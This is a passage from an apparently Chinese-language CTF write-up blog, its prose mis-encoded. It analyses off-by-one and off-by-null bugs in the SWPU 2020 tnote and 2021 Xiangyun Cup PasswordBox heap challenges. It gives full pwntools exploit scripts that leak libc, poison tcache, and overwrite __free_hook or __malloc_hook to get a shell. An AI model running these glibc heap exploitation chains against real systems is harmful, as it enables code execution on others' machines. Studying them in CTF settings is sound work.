class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p8(<span class="number">0x70</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>)</span><br><span class="line">payload = <span class="string">b&#x27;aaa&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) -<span class="number">0x3c5600</span></span><br><span class="line">malloc_hook_offset = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] -<span class="number">0x23</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">one = libc_base + one_gadget[<span class="number">1</span>]</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(malloc_hook_offset))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x13</span>-<span class="number">8</span>) + p64(one)+p64(realloc+<span class="number">12</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="SWPU-2020-tnote"><a class="header-anchor" href="#SWPU-2020-tnote">Â¶</a>SWPU 2020 tnote</h2>
<h3 id="æ¼æ´åˆ†æ-v2"><a class="header-anchor" href="#æ¼æ´åˆ†æ-v2">Â¶</a>æ¼æ´åˆ†æ</h3>
<p>åœ¨é¢˜ç›®çš„editå‡½æ•°ä¸­å­˜åœ¨off by one</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= dword_202060[v3]; ++i )  <span class="comment">//off by one</span></span><br><span class="line">&#123;</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  *(_BYTE *)(i + qword_202080[v3]) = buf;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨off by one æ¥ä¿®æ”¹ chunk çš„szie ä½æ¥é€ æˆtacahe overlapping</p>
<h3 id="è§£é¢˜æ­¥éª¤-v2"><a class="header-anchor" href="#è§£é¢˜æ­¥éª¤-v2">Â¶</a>è§£é¢˜æ­¥éª¤</h3>
<p>Step1:æ„é€ overlapped chunk</p>
<p>åœ¨ç”³è¯·çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼Œchunk2å’Œchunk4çš„å¤§å°ä¸€è‡´ï¼Œæ–¹ä¾¿ç­‰ä¸‹é‡Šæ”¾è¿›å…¥tacahe</p>
<p>ä¿®æ”¹chunk1 çš„å¤§å°ä¸º0x71ï¼Œæ­¤æ—¶chunk1å’Œchunk2é‡åˆ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#1 0x21 </span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2 0x51</span></span><br><span class="line">add(<span class="number">0x38</span>) <span class="comment">#3 0x41</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#4 0x51</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x71&#x27;</span>)  <span class="comment">#chunk1 =&gt; 0x71</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br></pre></td></tr></table></figure>
<p>Step2:æ³„éœ²å †åœ°å€</p>
<p>é‡Šæ”¾chunk4å’Œchunk2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; hex 0x55c37c076000 2000</span><br><span class="line">+0000 0x55c37c076000  00 00 00 00  00 00 00 00  51 02 00 00  00 00 00 00  â”‚....â”‚....â”‚Q...â”‚....â”‚</span><br><span class="line">+0010 0x55c37c076010  00 00 00 02  00 00 00 00  00 00 00 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">+0020 0x55c37c076020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">...</span><br><span class="line">+0060 0x55c37c076060  00 00 00 00  00 00 00 00  a0 62 07 7c  c3 55 00 00  â”‚....â”‚....â”‚.b.|â”‚.U..â”‚</span><br><span class="line">+0070 0x55c37c076070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">...</span><br><span class="line">+0250 0x55c37c076250  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  â”‚....â”‚....â”‚!...â”‚....â”‚</span><br><span class="line">+0260 0x55c37c076260  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  â”‚aaaaâ”‚aaaaâ”‚aaaaâ”‚aaaaâ”‚</span><br><span class="line">+0270 0x55c37c076270  61 61 61 61  61 61 61 61  71 00 00 00  00 00 00 00  â”‚aaaaâ”‚aaaaâ”‚q...â”‚....â”‚</span><br><span class="line">+0280 0x55c37c076280  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">+0290 0x55c37c076290  00 00 00 00  00 00 00 00  51 00 00 00  00 00 00 00  â”‚....â”‚....â”‚Q...â”‚....â”‚</span><br><span class="line">+02a0 0x55c37c0762a0  30 63 07 7c  c3 55 00 00  10 60 07 7c  c3 55 00 00  â”‚0c.|â”‚.U..â”‚.`.|â”‚.U..â”‚</span><br><span class="line">+02b0 0x55c37c0762b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">...</span><br><span class="line">+02e0 0x55c37c0762e0  00 00 00 00  00 00 00 00  41 00 00 00  00 00 00 00  â”‚....â”‚....â”‚A...â”‚....â”‚</span><br><span class="line">+02f0 0x55c37c0762f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">...</span><br><span class="line">+0320 0x55c37c076320  00 00 00 00  00 00 00 00  51 00 00 00  00 00 00 00  â”‚....â”‚....â”‚Q...â”‚....â”‚</span><br><span class="line">+0330 0x55c37c076330  00 00 00 00  00 00 00 00  10 60 07 7c  c3 55 00 00  â”‚....â”‚....â”‚.`.|â”‚.U..â”‚</span><br><span class="line">+0340 0x55c37c076340  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">...</span><br><span class="line">+0370 0x55c37c076370  00 00 00 00  00 00 00 00  91 0c 02 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">+0380 0x55c37c076380  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x50 [  2]: 0x55c37c0762a0 â€”&gt; 0x55c37c076330 &lt;â€” 0x0</span><br></pre></td></tr></table></figure>
<p>æ³„éœ²å †åœ°å€ï¼Œåˆ©ç”¨heap_addrè®¡ç®—å‡ºå­˜å‚¨0x90å¤§å°çš„tacahe bin countçš„ä½ç½®ä»¥åŠ0x50å¤§å°çš„tacahe binåœ¨tacahe structä¸­çš„ä½ç½®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x330</span></span><br><span class="line">tacahe_addr = heap + <span class="number">0x68</span></span><br><span class="line">count0x90 = heap + <span class="number">0x17</span></span><br></pre></td></tr></table></figure>
<p>Step3 æ³„éœ²libc</p>
<p>æ³„éœ²libcçš„æ€è·¯å°±æ˜¯å°†0x90å¤§å°çš„tacahe binçš„conunt æ”¹ä¸º 7 è¿™æ ·å½“æˆ‘å†é‡Šæ”¾ä¸‹ä¸€ä¸ª0x90å¤§å°çš„å †çš„æ—¶å€™ä»–å°±ä¼šè¿›å…¥unsorted binè¿›è€Œunsorted bin attack</p>
<p>åœ¨è¿™ä¹‹å‰å…ˆåˆ©ç”¨ä¹‹å‰overlapä¿®æ”¹ tcachebin fd æŒ‡é’ˆæŒ‡å‘ç»“æ„ä½“ï¼Œç¬¬äºŒæ¬¡ç”³è¯·å°±èƒ½ç”³è¯·åˆ° tcache ç»“æ„ä½“,ä»è€Œä¿®æ”¹æ•°é‡tacahe count</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x51</span>)+p64(tacahe_addr))</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + <span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#4	</span></span><br><span class="line">edit(<span class="number">4</span>, p64(heap-<span class="number">0x319</span>)) <span class="comment">#ä»»æ„åœ°å€å†™</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pwndbg&gt; bins</span></span><br><span class="line"><span class="string"># tcachebins</span></span><br><span class="line"><span class="string">0x50 [  0]: 0x558836a30017 &lt;â€” ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="string">&#x27;\x07&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶çš„0x90å¤§å°çš„tacahe count å·²ç»è¢«æ”¹æˆäº†7ï¼Œæ¥ä¸‹æ¥åªè¦é‡Šæ”¾ä¸€ä¸ªå¤§å°ä¸º0x90çš„chunkå®ƒå°±ä¼šè¿›å…¥unsorted bin</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br></pre></td></tr></table></figure>
<p>Step4: åˆ©ç”¨ä¹‹å‰çš„ä»»æ„åœ°å€å†™ä¿®æ”¹__free_hookä¸ºsystemæ¥getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">4</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2 </span></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br></pre></td></tr></table></figure>
<h3 id="exp-v6"><a class="header-anchor" href="#exp-v6">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;AAA&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;AAA&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;1.14.71.254&quot;,28051)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;E&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;D&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))   </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;S&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))   </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#1 0x21 </span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2 0x51</span></span><br><span class="line">add(<span class="number">0x38</span>) <span class="comment">#3 0x41</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#4 0x51</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x71&#x27;</span>)  <span class="comment">#chunk1 =&gt; 0x71</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">tacahe_addr = heap - <span class="number">0x2C8</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x51</span>)+p64(tacahe_addr))</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + <span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#4	</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, p64(heap-<span class="number">0x319</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="string">&#x27;\x07&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2 </span></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>p.s. æœ¬é¢˜çš„flagåœ¨/home/ctf/flag.txt</p>
<h2 id="2021-ç¥¥äº‘æ¯-PasswordBox-free-Version"><a class="header-anchor" href="#2021-ç¥¥äº‘æ¯-PasswordBox-free-Version">Â¶</a>[2021 ç¥¥äº‘æ¯]PasswordBox free Version</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v3"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v3">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>1.å¼‚æˆ–ç®—æ³•
2.off by null
3.Unlink
4.glibc 2.27 -v1.4 double free
</code></pre>
<h3 id="åŠŸèƒ½åˆ†æ"><a class="header-anchor" href="#åŠŸèƒ½åˆ†æ">Â¶</a>åŠŸèƒ½åˆ†æ</h3>
<p>addå‡½æ•°ä¸»è¦ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size &lt;= <span class="number">0x100</span> )</span><br><span class="line">&#123;</span><br><span class="line">  s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your Pwd:&quot;</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  fgets(s, size + <span class="number">1</span>, <span class="built_in">stdin</span>);                <span class="comment">// off by null</span></span><br><span class="line">  encrypt((__int64)s, size);</span><br><span class="line">  *((_DWORD *)&amp;lenarray + <span class="number">8</span> * SHIDWORD(size)) = size;</span><br><span class="line">  *((_QWORD *)&amp;heaparray + <span class="number">4</span> * SHIDWORD(size)) = s;</span><br><span class="line">  isAlive[<span class="number">8</span> * SHIDWORD(size)] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !ifFirst )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First Add Done.Thx 4 Use. Save ID:%s&quot;</span>, *((<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;heaparray + <span class="number">4</span> * SHIDWORD(size)));</span><br><span class="line">    ifFirst = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>fgets å­˜åœ¨off by null å¯ä»¥è®©æˆ‘ä»¬åé¢ä¿®æ”¹chunkçš„size</p>
<p>ä¸”è¾“å…¥çš„contentä¼šè¿›è¡Œä¸€æ¬¡åŠ å¯†ï¼ŒåŠ å¯†å‡½æ•°å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">encrypt</span><span class="params">(__int64 note, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">2</span> * (a2 / <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a2 % <span class="number">16</span> &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 % <span class="number">16</span> &gt; <span class="number">0</span> )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_QWORD *)(<span class="number">8LL</span> * i + note) ^= key;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°æ˜¯ä»¥å…«ä½ä¸ºå•ä½è¿›è¡Œäº¦æˆ–æ“ä½œï¼Œä½†æ˜¯æ¯æ¬¡çš„keyéƒ½æ˜¯éšæœºç”Ÿæˆçš„ï¼Œè€Œç”±äºè·å–æˆ‘ä»¬è¾“å…¥çš„æ˜¯fgets,å½“å®ƒè¯»åˆ°&quot;\n&quot;ä¸”ä½ è¾“å…¥çš„contentå°äºsizeï¼Œå°±ä¼šå°†å‰©ä¸‹çš„ç”¨0å¡«å……ï¼Œç”±äº0^key=keyè¿™æ ·æˆ‘ä»¬å°±èƒ½å¾—åˆ°keyäº†</p>
<p>editå‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !isFirst )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v1);</span><br><span class="line">    getchar();</span><br><span class="line">    isFirst = <span class="number">1LL</span>;</span><br><span class="line">    read(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;heaparray + <span class="number">4</span> * v1), <span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Because this is Free Version.The edit Function is Limit to use&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸€ä¸ªå †ï¼Œä¸€ç”Ÿåªèƒ½edit1æ¬¡ï¼Œä¸”åªèƒ½æ”¹0x10çš„å¤§å°</p>
<p>freeå’Œshowéƒ½æ˜¯æ­£å¸¸çš„freeå’Œshow</p>
<p>##è§£é¢˜æ­¥éª¤<br>
Step1: è·å¾—key<br>
åˆ©ç”¨a ^ 0 = açš„ç‰¹æ€§ï¼Œå¾—åˆ°key</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Save ID:&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br></pre></td></tr></table></figure>
<p>Step2:æ„é€ overlapped chunk leak libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å¡«æ»¡tacahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#0 (7)</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#1  (8)</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#2 (9)</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#3  (10)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>) </span><br><span class="line">free(<span class="number">7</span>)  <span class="comment">#freeä¸€ä¸ªæ­£å¸¸çš„chunkä»¥ä¾¿ç»•è¿‡Unlinkæ£€æµ‹</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64((<span class="number">0x80</span>+<span class="number">0x100</span>)^key)) <span class="comment">#size = chunk8 + chunk7</span></span><br><span class="line">free(<span class="number">9</span>)   <span class="comment">#unlink </span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;is: &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) ^ key </span><br><span class="line">libc_base -= <span class="number">0x3ebca0</span></span><br></pre></td></tr></table></figure>
<p>Step3:double freeä¿®æ”¹free_hook,æ³¨æ„åœ¨ç¬¬äºŒæ¬¡freeä¹‹å‰è¦ä¿®æ”¹æ ‡å¿—ä½</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">3</span>)   <span class="comment">#double free</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook^key))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system^key))</span><br><span class="line">add(<span class="number">0x60</span>,p64(binsh^key))</span><br><span class="line">free(<span class="number">5</span>) </span><br></pre></td></tr></table></figure>
<h3 id="EXP-v2"><a class="header-anchor" href="#EXP-v2">Â¶</a>EXP</h3>
